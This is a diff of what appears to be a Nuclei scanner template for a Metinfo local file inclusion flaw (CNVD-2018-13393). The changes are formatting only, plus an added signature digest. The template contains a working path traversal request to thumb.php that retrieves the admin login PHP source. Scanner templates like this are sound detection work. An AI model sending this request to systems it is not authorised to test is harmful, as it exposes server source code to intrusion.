@@ -1,5 +1,4 @@
 id: CNVD-2018-13393
-
 info:
   name: Metinfo - Local File Inclusion
   author: ritikchaddha
@@ -13,16 +12,13 @@ info:
     cwe-id: CWE-22
   metadata:
     max-request: 1
-  tags: cnvd2018,cnvd,metinfo,cvnd2018,lfi,vuln
-
+  tags: cnvd,cnvd2018,cvnd2018,lfi,metinfo,vuln
 http:
   - method: GET
     path:
       - '{{BaseURL}}/include/thumb.php?dir=http\..\admin\login\login_check.php'
-
     host-redirects: true
     max-redirects: 2
-
     matchers-condition: and
     matchers:
       - type: word
@@ -31,4 +27,4 @@ http:
           - "<?php"
           - "login_met_cookie($metinfo_admin_name);"
         condition: and
-
+        # digest: 490a004630440220355b8b9a858cbe7d2332a037563a7d4710e4837de8b9eefee8429267b0e904f202205a167c0ec395423393be593886541e50268ab496ee1273a1c6fa389abc03c3db:922c64590222798bb761d5b6d8e72950
